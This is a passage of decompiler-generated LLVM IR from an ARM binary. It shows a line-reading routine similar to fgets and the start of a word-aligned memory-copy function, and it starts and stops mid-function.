  store i32 1, i32* %r2.global-to-local, align 4
  %v5_197f0 = call i32 @function_1b108(i16* %v1_197e4, i32 %v2_197e8, i32 1)
  store i32 %v5_197f0, i32* %r0.global-to-local, align 4
  %v2_197f4 = icmp eq i32 %v5_197f0, 0
  br i1 %v2_197f4, label %dec_label_pc_19800, label %bb23

bb23:                                             ; preds = %dec_label_pc_197e4
  %v4_197f8 = load i8, i8* %stack_var_-17, align 1
  %v5_197f8 = sext i8 %v4_197f8 to i32
  store i32 %v5_197f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19804

dec_label_pc_19800:                               ; preds = %dec_label_pc_197e4, %dec_label_pc_19728, %dec_label_pc_197b8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19804

dec_label_pc_19804:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_197cc, %dec_label_pc_19744, %dec_label_pc_19800
  %v2_19808 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19808, i32* @r4, align 4
  store i32 %v6_196ec, i32* @r5, align 4
  store i32 %v9_196ec, i32* @lr, align 4
  %v1_1980c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1980c

; uselistorder directives
  uselistorder i32 %v2_1976c, { 1, 0, 2 }
  uselistorder i32 %v2_19778, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_196f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_196f0, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 3, 4, 0, 5, 6, 1, 7, 8, 9, 10, 11, 2, 13 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_19804, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_19800, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_19818(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_19818:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_19818 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1981c = icmp eq i32 %arg2, 0
  store i1 %v2_1981c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_198a4, label %dec_label_pc_1988c.preheader

dec_label_pc_1988c.preheader:                     ; preds = %dec_label_pc_19818
  store i32 %tmp, i32* @r5, align 4
  %v1_1988c2 = add i32 %arg2, -1
  store i32 %v1_1988c2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1988c8 = icmp eq i32 %arg2, 1
  store i1 %v7_1988c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1988c8, label %dec_label_pc_19894, label %dec_label_pc_19838

dec_label_pc_19838:                               ; preds = %dec_label_pc_1988c.preheader, %dec_label_pc_1988c.backedge.dec_label_pc_19838_crit_edge
  %v0_1985c = phi i32 [ %v0_19838.pre, %dec_label_pc_1988c.backedge.dec_label_pc_19838_crit_edge ], [ %arg3, %dec_label_pc_1988c.preheader ]
  %v1_19838 = add i32 %v0_1985c, 16
  %v2_19838 = inttoptr i32 %v1_19838 to i32*
  %v3_19838 = load i32, i32* %v2_19838, align 4
  store i32 %v3_19838, i32* %r2.global-to-local, align 4
  %v1_1983c = add i32 %v0_1985c, 24
  %v2_1983c = inttoptr i32 %v1_1983c to i32*
  %v3_1983c = load i32, i32* %v2_1983c, align 4
  store i32 %v3_1983c, i32* %r3.global-to-local, align 4
  %v3_19840 = icmp uge i32 %v3_19838, %v3_1983c
  store i1 %v3_19840, i1* %cpsr_c.global-to-local, align 1
  %v9_19840 = icmp eq i32 %v3_19838, %v3_1983c
  store i1 %v9_19840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19840, label %dec_label_pc_1985c, label %dec_label_pc_19848

dec_label_pc_19848:                               ; preds = %dec_label_pc_19838
  %v1_19848 = inttoptr i32 %v3_19838 to i8*
  %v2_19848 = load i8, i8* %v1_19848, align 1
  %v3_19848 = zext i8 %v2_19848 to i32
  store i32 %v3_19848, i32* %r3.global-to-local, align 4
  %v5_19848 = add i32 %v3_19838, 1
  store i32 %v5_19848, i32* %r2.global-to-local, align 4
  %v2_1984c = load i32, i32* @r5, align 4
  %v3_1984c = inttoptr i32 %v2_1984c to i8*
  store i8 %v2_19848, i8* %v3_1984c, align 1
  %v4_1984c = load i32, i32* @r5, align 4
  %v5_1984c = add i32 %v4_1984c, 1
  store i32 %v5_1984c, i32* @r5, align 4
  %v0_19850 = load i32, i32* %r3.global-to-local, align 4
  %v2_19850 = icmp ugt i32 %v0_19850, 9
  store i1 %v2_19850, i1* %cpsr_c.global-to-local, align 1
  %v7_19850 = icmp eq i32 %v0_19850, 10
  store i1 %v7_19850, i1* %cpsr_z.global-to-local, align 1
  %v0_19854 = load i32, i32* %r2.global-to-local, align 4
  %v1_19854 = load i32, i32* @r4, align 4
  %v2_19854 = add i32 %v1_19854, 16
  %v3_19854 = inttoptr i32 %v2_19854 to i32*
  store i32 %v0_19854, i32* %v3_19854, align 4
  br i1 %v7_19850, label %dec_label_pc_19894, label %dec_label_pc_1988c.backedge

dec_label_pc_1985c:                               ; preds = %dec_label_pc_19838
  %v1_1985c = inttoptr i32 %v0_1985c to i16*
  %v3_19860 = call i32 @function_196ec(i16* %v1_1985c)
  %v3_19864 = icmp eq i32 %v3_19860, -1
  store i1 %v3_19864, i1* %cpsr_c.global-to-local, align 1
  %v8_19864 = icmp eq i32 %v3_19860, -1
  store i1 %v8_19864, i1* %cpsr_z.global-to-local, align 1
  %v1_19868 = urem i32 %v3_19860, 256
  store i32 %v1_19868, i32* %r3.global-to-local, align 4
  br i1 %v3_19864, label %dec_label_pc_19870, label %dec_label_pc_19888

dec_label_pc_19870:                               ; preds = %dec_label_pc_1985c
  %v0_19870 = load i32, i32* @r4, align 4
  %v1_19870 = inttoptr i32 %v0_19870 to i16*
  %v2_19870 = load i16, i16* %v1_19870, align 2
  %v3_19870 = zext i16 %v2_19870 to i32
  store i32 %v3_19870, i32* %r3.global-to-local, align 4
  %v1_19874 = and i32 %v3_19870, 8
  %v2_19874 = icmp eq i32 %v1_19874, 0
  store i1 %v2_19874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19874, label %dec_label_pc_19894, label %dec_label_pc_198a4

dec_label_pc_19888:                               ; preds = %dec_label_pc_1985c
  %v1_19880 = trunc i32 %v3_19860 to i8
  %v2_19880 = load i32, i32* @r5, align 4
  %v3_19880 = inttoptr i32 %v2_19880 to i8*
  store i8 %v1_19880, i8* %v3_19880, align 1
  %v4_19880 = load i32, i32* @r5, align 4
  %v5_19880 = add i32 %v4_19880, 1
  store i32 %v5_19880, i32* @r5, align 4
  %v0_19884 = load i32, i32* %r3.global-to-local, align 4
  %v2_19884 = icmp ugt i32 %v0_19884, 9
  store i1 %v2_19884, i1* %cpsr_c.global-to-local, align 1
  %v7_19884 = icmp eq i32 %v0_19884, 10
  store i1 %v7_19884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19884, label %dec_label_pc_19894, label %dec_label_pc_1988c.backedge

dec_label_pc_1988c.backedge:                      ; preds = %dec_label_pc_19888, %dec_label_pc_19848
  %v0_1988c = load i32, i32* %r6.global-to-local, align 4
  %v1_1988c = add i32 %v0_1988c, -1
  store i32 %v1_1988c, i32* %r6.global-to-local, align 4
  %v2_1988c = icmp ne i32 %v0_1988c, 0
  store i1 %v2_1988c, i1* %cpsr_c.global-to-local, align 1
  %v7_1988c = icmp eq i32 %v0_1988c, 1
  store i1 %v7_1988c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1988c, label %dec_label_pc_19894, label %dec_label_pc_1988c.backedge.dec_label_pc_19838_crit_edge

dec_label_pc_1988c.backedge.dec_label_pc_19838_crit_edge: ; preds = %dec_label_pc_1988c.backedge
  %v0_19838.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19838

dec_label_pc_19894:                               ; preds = %dec_label_pc_19888, %dec_label_pc_1988c.backedge, %dec_label_pc_19848, %dec_label_pc_1988c.preheader, %dec_label_pc_19870
  %v0_19894 = load i32, i32* @r5, align 4
  %v1_19894 = load i32, i32* @r7, align 4
  %v3_19894 = icmp uge i32 %v0_19894, %v1_19894
  store i1 %v3_19894, i1* %cpsr_c.global-to-local, align 1
  %v9_19894 = icmp eq i32 %v0_19894, %v1_19894
  store i1 %v9_19894, i1* %cpsr_z.global-to-local, align 1
  %v2_19898 = xor i1 %v9_19894, true
  %v3_19898 = and i1 %v3_19894, %v2_19898
  br i1 %v3_19898, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_19894
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1989c = inttoptr i32 %v0_19894 to i8*
  store i8 0, i8* %v7_1989c, align 1
  %v0_198a0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_198a0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_19894, %bb
  %v1_198a0 = phi i1 [ %v1_198a0.pre, %bb ], [ %v9_19894, %dec_label_pc_19894 ]
  %v0_198a0 = phi i1 [ %v0_198a0.pre, %bb ], [ %v3_19894, %dec_label_pc_19894 ]
  %v2_198a0 = xor i1 %v1_198a0, true
  %v3_198a0 = and i1 %v0_198a0, %v2_198a0
  br i1 %v3_198a0, label %.dec_label_pc_198a8_crit_edge, label %dec_label_pc_198a4

.dec_label_pc_198a8_crit_edge:                    ; preds = %.thread14
  %v0_198a8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_198a8

dec_label_pc_198a4:                               ; preds = %dec_label_pc_19818, %dec_label_pc_19870, %.thread14
  br label %dec_label_pc_198a8

dec_label_pc_198a8:                               ; preds = %.dec_label_pc_198a8_crit_edge, %dec_label_pc_198a4
  %v0_198a8 = phi i32 [ %v0_198a8.pre, %.dec_label_pc_198a8_crit_edge ], [ 0, %dec_label_pc_198a4 ]
  store i32 %v6_19818, i32* @r5, align 4
  ret i32 %v0_198a8

; uselistorder directives
  uselistorder i1 %v9_19894, { 1, 0, 2 }
  uselistorder i32 %v1_19894, { 1, 0 }
  uselistorder i32 %v0_19894, { 0, 2, 1 }
  uselistorder i32 %v0_1988c, { 2, 0, 1 }
  uselistorder i32 %v0_19884, { 1, 0 }
  uselistorder i32 %v3_19860, { 2, 1, 0, 3 }
  uselistorder i32 %v0_19850, { 1, 0 }
  uselistorder i32 %v3_19838, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1985c, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @function_196ec, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_198a8, { 1, 0 }
  uselistorder label %dec_label_pc_198a4, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_19894, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_19838, { 1, 0 }
}

define i32 @function_198b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_198b8:
  ret i32 %arg1
}

define i32 @function_198c0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_198c0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_198c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_198c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_198c0 = sub i32 %v0_198c0, %v1_198c0
  %v3_198c0 = icmp ult i32 %v0_198c0, %v1_198c0
  %v4_198c0 = xor i32 %v1_198c0, %v0_198c0
  %v5_198c0 = xor i32 %v2_198c0, %v0_198c0
  %v6_198c0 = and i32 %v5_198c0, %v4_198c0
  %v7_198c0 = icmp slt i32 %v6_198c0, 0
  store i1 %v7_198c0, i1* %cpsr_v.global-to-local, align 1
  %v8_198c0 = icmp slt i32 %v2_198c0, 0
  store i1 %v8_198c0, i1* %cpsr_n.global-to-local, align 1
  %v9_198c0 = icmp eq i32 %v0_198c0, %v1_198c0
  store i1 %v9_198c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_198c0, label %dec_label_pc_19b14, label %dec_label_pc_198c8

dec_label_pc_198c8:                               ; preds = %dec_label_pc_198c0
  br i1 %v9_198c0, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_198c8
  %merge = phi i32 [ %v0_198c0, %dec_label_pc_198c8 ], [ %v2_19ba8, %bb150 ], [ %v11_19bc4, %bb153 ], [ %v7_19bc4, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_198c8
  %v5_198cc = inttoptr i32 %v1_198c0 to i8*
  store i8* %v5_198cc, i8** %stack_var_-8, align 4
  %v8_198cc = load i32, i32* @lr, align 4
  %v0_198d0 = load i32, i32* @r2, align 4
  %v2_198d0 = add i32 %v0_198d0, -4
  store i32 %v2_198d0, i32* %r2.global-to-local, align 4
  %v4_198d0 = sub i32 3, %v0_198d0
  %v5_198d0 = and i32 %v4_198d0, %v0_198d0
  %v6_198d0 = icmp slt i32 %v5_198d0, 0
  store i1 %v6_198d0, i1* %cpsr_v.global-to-local, align 1
  %v7_198d0 = icmp slt i32 %v2_198d0, 0
  store i1 %v7_198d0, i1* %cpsr_n.global-to-local, align 1
  %v8_198d0 = icmp eq i32 %v0_198d0, 4
  store i1 %v8_198d0, i1* %cpsr_z.global-to-local, align 1
  %v5_198d4 = icmp slt i32 %v0_198d0, 4
  br i1 %v5_198d4, label %bb140, label %dec_label_pc_198d8

dec_label_pc_198d8:                               ; preds = %bb
  %v1_198d8 = urem i32 %v1_198c0, 4
  store i32 %v1_198d8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_198d8 = icmp eq i32 %v1_198d8, 0
  store i1 %v2_198d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198d8, label %dec_label_pc_198e0, label %dec_label_pc_1998c

dec_label_pc_198e0:                               ; preds = %dec_label_pc_198d8
  %v1_198e0 = urem i32 %v0_198c0, 4
  store i32 %v1_198e0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_198e0 = icmp eq i32 %v1_198e0, 0
  store i1 %v2_198e0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_198c0 to i2
  br i1 %v2_198e0, label %dec_label_pc_198e8, label %dec_label_pc_199bc

dec_label_pc_198e8:                               ; preds = %dec_label_pc_198e0, %dec_label_pc_199b4
  %v0_1990093 = phi i32 [ %v1_198c0, %dec_label_pc_198e0 ], [ %v0_19adc76, %dec_label_pc_199b4 ]
  %v0_198fc92 = phi i32 [ %v0_198c0, %dec_label_pc_198e0 ], [ %v0_199b4, %dec_label_pc_199b4 ]
  %v0_198e8 = phi i32 [ %v2_198d0, %dec_label_pc_198e0 ], [ %v2_199ac, %dec_label_pc_199b4 ]
  %v1_198e8 = add i32 %v0_198e8, -8
  store i32 %v1_198e8, i32* %r2.global-to-local, align 4
  %v3_198e8 = sub i32 7, %v0_198e8
  %v4_198e8 = and i32 %v3_198e8, %v0_198e8
  %v5_198e8 = icmp slt i32 %v4_198e8, 0
  store i1 %v5_198e8, i1* %cpsr_v.global-to-local, align 1
  %v6_198e8 = icmp slt i32 %v1_198e8, 0
  store i1 %v6_198e8, i1* %cpsr_n.global-to-local, align 1
  %v7_198e8 = icmp eq i32 %v0_198e8, 8
  store i1 %v7_198e8, i1* %cpsr_z.global-to-local, align 1
  %v2_198ec = xor i1 %v6_198e8, %v5_198e8
  br i1 %v2_198ec, label %dec_label_pc_1993c, label %dec_label_pc_198f0

dec_label_pc_198f0:                               ; preds = %dec_label_pc_198e8
  %v1_198f0 = add i32 %v0_198e8, -28
  store i32 %v1_198f0, i32* %r2.global-to-local, align 4
  %v3_198f0 = sub i32 27, %v0_198e8
  %v4_198f0 = and i32 %v3_198f0, %v1_198e8
  %v5_198f0 = icmp slt i32 %v4_198f0, 0
  store i1 %v5_198f0, i1* %cpsr_v.global-to-local, align 1
  %v6_198f0 = icmp slt i32 %v1_198f0, 0
  store i1 %v6_198f0, i1* %cpsr_n.global-to-local, align 1
  %v7_198f0 = icmp eq i32 %v1_198e8, 20
  store i1 %v7_198f0, i1* %cpsr_z.global-to-local, align 1
  %v2_198f4 = xor i1 %v6_198f0, %v5_198f0
  br i1 %v2_198f4, label %dec_label_pc_19928, label %dec_label_pc_198f8

dec_label_pc_198f8:                               ; preds = %dec_label_pc_198f0
  %v0_198f8 = load i32, i32* @r4, align 4
  store i32 %v0_198f8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_198fc

dec_label_pc_198fc:                               ; preds = %dec_label_pc_198fc.dec_label_pc_198fc_crit_edge, %dec_label_pc_198f8
  %v0_19900 = phi i32 [ %v12_19908, %dec_label_pc_198fc.dec_label_pc_198fc_crit_edge ], [ %v0_1990093, %dec_label_pc_198f8 ]
  %v0_198fc = phi i32 [ %v0_198fc.pre, %dec_label_pc_198fc.dec_label_pc_198fc_crit_edge ], [ %v0_198fc92, %dec_label_pc_198f8 ]
  %v1_198fc = inttoptr i32 %v0_198fc to i32*
  %v2_198fc = load i32, i32* %v1_198fc, align 4
  %v3_198fc = add i32 %v0_198fc, 4
  %v4_198fc = inttoptr i32 %v3_198fc to i32*
  %v5_198fc = load i32, i32* %v4_198fc, align 4
  store i32 %v5_198fc, i32* %r4.global-to-local, align 4
  %v6_198fc = add i32 %v0_198fc, 8
  %v7_198fc = inttoptr i32 %v6_198fc to i32*
  %v8_198fc = load i32, i32* %v7_198fc, align 4
  store i32 %v8_198fc, i32* %ip.global-to-local, align 4
  %v9_198fc = add i32 %v0_198fc, 12
  %v10_198fc = inttoptr i32 %v9_198fc to i32*
  %v11_198fc = load i32, i32* %v10_198fc, align 4
  store i32 %v11_198fc, i32* %lr.global-to-local, align 4
  %v12_198fc = add i32 %v0_198fc, 16
  store i32 %v12_198fc, i32* %r1.global-to-local, align 4
  %v1_19900 = inttoptr i32 %v0_19900 to i32*
  store i32 %v2_198fc, i32* %v1_19900, align 4
  %v3_19900 = add i32 %v0_19900, 4
  %v4_19900 = inttoptr i32 %v3_19900 to i32*
  %v5_19900 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19900, i32* %v4_19900, align 4
  %v6_19900 = add i32 %v0_19900, 8
  %v7_19900 = inttoptr i32 %v6_19900 to i32*
  %v8_19900 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_19900, i32* %v7_19900, align 4
  %v9_19900 = add i32 %v0_19900, 12
  %v10_19900 = inttoptr i32 %v9_19900 to i32*
  %v11_19900 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_19900, i32* %v10_19900, align 4
  %v12_19900 = add i32 %v0_19900, 16
  store i32 %v12_19900, i32* %r0.global-to-local, align 4
  %v0_19904 = load i32, i32* %r1.global-to-local, align 4
  %v1_19904 = inttoptr i32 %v0_19904 to i32*
  %v2_19904 = load i32, i32* %v1_19904, align 4
  store i32 %v2_19904, i32* @r3, align 4
  %v3_19904 = add i32 %v0_19904, 4
  %v4_19904 = inttoptr i32 %v3_19904 to i32*
  %v5_19904 = load i32, i32* %v4_19904, align 4
  store i32 %v5_19904, i32* %r4.global-to-local, align 4
  %v6_19904 = add i32 %v0_19904, 8
  %v7_19904 = inttoptr i32 %v6_19904 to i32*
  %v8_19904 = load i32, i32* %v7_19904, align 4
  store i32 %v8_19904, i32* @ip, align 4
  %v9_19904 = add i32 %v0_19904, 12
  %v10_19904 = inttoptr i32 %v9_19904 to i32*
  %v11_19904 = load i32, i32* %v10_19904, align 4
  store i32 %v11_19904, i32* %lr.global-to-local, align 4
  %v12_19904 = add i32 %v0_19904, 16
  store i32 %v12_19904, i32* %r1.global-to-local, align 4
  %v1_19908 = inttoptr i32 %v12_19900 to i32*
  store i32 %v2_19904, i32* %v1_19908, align 4
  %v3_19908 = add i32 %v0_19900, 20
  %v4_19908 = inttoptr i32 %v3_19908 to i32*
  %v5_19908 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19908, i32* %v4_19908, align 4
  %v6_19908 = add i32 %v0_19900, 24
  %v7_19908 = inttoptr i32 %v6_19908 to i32*
  %v8_19908 = load i32, i32* @ip, align 4
  store i32 %v8_19908, i32* %v7_19908, align 4
  %v9_19908 = add i32 %v0_19900, 28
  %v10_19908 = inttoptr i32 %v9_19908 to i32*
  %v11_19908 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_19908, i32* %v10_19908, align 4
  %v12_19908 = add i32 %v0_19900, 32
  store i32 %v12_19908, i32* %r0.global-to-local, align 4
  %v0_1990c = load i32, i32* %r2.global-to-local, align 4
  %v1_1990c = add i32 %v0_1990c, -32
  store i32 %v1_1990c, i32* %r2.global-to-local, align 4
  %v3_1990c = sub i32 31, %v0_1990c
  %v4_1990c = and i32 %v3_1990c, %v0_1990c
  %v5_1990c = icmp slt i32 %v4_1990c, 0
  %v6_1990c = icmp slt i32 %v1_1990c, 0
  %v2_19910 = xor i1 %v6_1990c, %v5_1990c
  br i1 %v2_19910, label %dec_label_pc_19914, label %dec_label_pc_198fc.dec_label_pc_198fc_crit_edge

dec_label_pc_198fc.dec_label_pc_198fc_crit_edge:  ; preds = %dec_label_pc_198fc
  %v0_198fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_198fc

dec_label_pc_19914:                               ; preds = %dec_label_pc_198fc
  %v1_19914 = add i32 %v0_1990c, -16
  %v3_19914 = add i32 %v0_1990c, 2147483616
  %v4_19914 = and i32 %v1_19914, %v3_19914
  %v5_19914 = icmp slt i32 %v4_19914, 0
  store i1 %v5_19914, i1* %cpsr_v.global-to-local, align 1
  %v6_19914 = icmp slt i32 %v1_19914, 0
  store i1 %v6_19914, i1* %cpsr_n.global-to-local, align 1
  %v7_19914 = icmp eq i32 %v1_19914, 0
  store i1 %v7_19914, i1* %cpsr_z.global-to-local, align 1
  %v2_19918 = xor i1 %v6_19914, %v5_19914
  br i1 %v2_19918, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_19914
  %v3_19918 = load i32, i32* %r1.global-to-local, align 4
  %v4_19918 = inttoptr i32 %v3_19918 to i32*
  %v5_19918 = load i32, i32* %v4_19918, align 4
  store i32 %v5_19918, i32* @r3, align 4
  %v6_19918 = add i32 %v3_19918, 4
  %v7_19918 = inttoptr i32 %v6_19918 to i32*
  %v8_19918 = load i32, i32* %v7_19918, align 4
  store i32 %v8_19918, i32* %r4.global-to-local, align 4
  %v9_19918 = add i32 %v3_19918, 8
  %v10_19918 = inttoptr i32 %v9_19918 to i32*
  %v11_19918 = load i32, i32* %v10_19918, align 4
  store i32 %v11_19918, i32* @ip, align 4
  %v12_19918 = add i32 %v3_19918, 12
  %v13_19918 = inttoptr i32 %v12_19918 to i32*
  %v14_19918 = load i32, i32* %v13_19918, align 4
  store i32 %v14_19918, i32* %lr.global-to-local, align 4
  %v15_19918 = add i32 %v3_19918, 16
  store i32 %v15_19918, i32* %r1.global-to-local, align 4
  %v4_1991c = inttoptr i32 %v12_19908 to i32*
  store i32 %v5_19918, i32* %v4_1991c, align 4
  %v6_1991c = add i32 %v0_19900, 36
  %v7_1991c = inttoptr i32 %v6_1991c to i32*
  %v8_1991c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1991c, i32* %v7_1991c, align 4
  %v9_1991c = add i32 %v0_19900, 40
  %v10_1991c = inttoptr i32 %v9_1991c to i32*
  %v11_1991c = load i32, i32* @ip, align 4
  store i32 %v11_1991c, i32* %v10_1991c, align 4
  %v12_1991c = add i32 %v0_19900, 44
  %v13_1991c = inttoptr i32 %v12_1991c to i32*
  %v14_1991c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1991c, i32* %v13_1991c, align 4
  %v15_1991c = add i32 %v0_19900, 48
  store i32 %v15_1991c, i32* %r0.global-to-local, align 4
  %v3_19920 = load i32, i32* %r2.global-to-local, align 4
  %v4_19920 = add i32 %v3_19920, -16
  store i32 %v4_19920, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_19914, %bb136
  %v3_19930101110 = phi i32 [ %v15_1991c, %bb136 ], [ %v12_19908, %dec_label_pc_19914 ]
  %v0_19928.pre = phi i32 [ %v4_19920, %bb136 ], [ %v1_1990c, %dec_label_pc_19914 ]
  %v2_19924 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19924, i32* @r4, align 4
  br label %dec_label_pc_19928

dec_label_pc_19928:                               ; preds = %dec_label_pc_198f0, %bb137
  %v3_19930100 = phi i32 [ %v0_1990093, %dec_label_pc_198f0 ], [ %v3_19930101110, %bb137 ]
  %v0_19928 = phi i32 [ %v1_198f0, %dec_label_pc_198f0 ], [ %v0_19928.pre, %bb137 ]
  %v1_19928 = add i32 %v0_19928, 20
  store i32 %v1_19928, i32* %r2.global-to-local, align 4
  %v3_19928 = sub i32 0, %v0_19928
  %v4_19928 = and i32 %v1_19928, %v3_19928
  %v5_19928 = icmp slt i32 %v4_19928, 0
  store i1 %v5_19928, i1* %cpsr_v.global-to-local, align 1
  %v6_19928 = icmp slt i32 %v1_19928, 0
  store i1 %v6_19928, i1* %cpsr_n.global-to-local, align 1
  %v7_19928 = icmp eq i32 %v1_19928, 0
  store i1 %v7_19928, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1992c

dec_label_pc_1992c:                               ; preds = %.thread114, %dec_label_pc_19928
  %v0_1993c.pre157 = phi i32 [ %v0_1993c.pre, %.thread114 ], [ %v1_19928, %dec_label_pc_19928 ]
  %v3_19930 = phi i32 [ %v3_1993098115, %.thread114 ], [ %v3_19930100, %dec_label_pc_19928 ]
  %v1_19934 = phi i1 [ %v1_19938, %.thread114 ], [ %v5_19928, %dec_label_pc_19928 ]
  %v0_19934 = phi i1 [ %v0_19938, %.thread114 ], [ %v6_19928, %dec_label_pc_19928 ]
  %v2_1992c = xor i1 %v1_19934, %v0_19934
  br i1 %v2_1992c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_1992c
  %v3_1992c = load i32, i32* %r1.global-to-local, align 4
  %v4_1992c = inttoptr i32 %v3_1992c to i32*
  %v5_1992c = load i32, i32* %v4_1992c, align 4
  store i32 %v5_1992c, i32* @r3, align 4
  %v6_1992c = add i32 %v3_1992c, 4
  %v7_1992c = inttoptr i32 %v6_1992c to i32*
  %v8_1992c = load i32, i32* %v7_1992c, align 4
  store i32 %v8_1992c, i32* @ip, align 4
  %v9_1992c = add i32 %v3_1992c, 8
  %v10_1992c = inttoptr i32 %v9_1992c to i32*
  %v11_1992c = load i32, i32* %v10_1992c, align 4
  store i32 %v11_1992c, i32* %lr.global-to-local, align 4
  %v12_1992c = add i32 %v3_1992c, 12
  store i32 %v12_1992c, i32* %r1.global-to-local, align 4
  %v4_19930 = inttoptr i32 %v3_19930 to i32*
  store i32 %v5_1992c, i32* %v4_19930, align 4
  %v6_19930 = add i32 %v3_19930, 4
  %v7_19930 = inttoptr i32 %v6_19930 to i32*
  %v8_19930 = load i32, i32* @ip, align 4
  store i32 %v8_19930, i32* %v7_19930, align 4
  %v9_19930 = add i32 %v3_19930, 8
  %v10_19930 = inttoptr i32 %v9_19930 to i32*
  %v11_19930 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_19930, i32* %v10_19930, align 4
  %v12_19930 = add i32 %v3_19930, 12
  store i32 %v12_19930, i32* %r0.global-to-local, align 4
  %v3_19934 = load i32, i32* %r2.global-to-local, align 4
  %v4_19934 = add i32 %v3_19934, -12
  store i32 %v4_19934, i32* %r2.global-to-local, align 4
  %v6_19934 = sub i32 11, %v3_19934
  %v7_19934 = and i32 %v6_19934, %v3_19934
  %v8_19934 = icmp slt i32 %v7_19934, 0
  store i1 %v8_19934, i1* %cpsr_v.global-to-local, align 1
  %v9_19934 = icmp slt i32 %v4_19934, 0
  store i1 %v9_19934, i1* %cpsr_n.global-to-local, align 1
  %v10_19934 = icmp eq i32 %v3_19934, 12
